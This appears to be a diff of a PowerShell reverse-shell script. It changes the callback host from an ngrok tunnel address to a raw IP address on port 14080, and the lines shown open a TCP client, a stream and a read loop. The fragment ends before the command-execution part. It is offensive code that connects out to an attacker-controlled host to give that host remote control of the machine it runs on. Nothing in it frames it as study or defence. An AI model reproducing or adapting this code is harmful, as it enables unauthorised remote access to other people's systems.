@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("6.tcp.eu.ngrok.io", 14080);
+$client = New-Object System.Net.Sockets.TCPClient("41.144.68.11", 14080);
 $stream = $client.GetStream();
 [byte[]]$buffer = 0..65535|%{0};
 while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
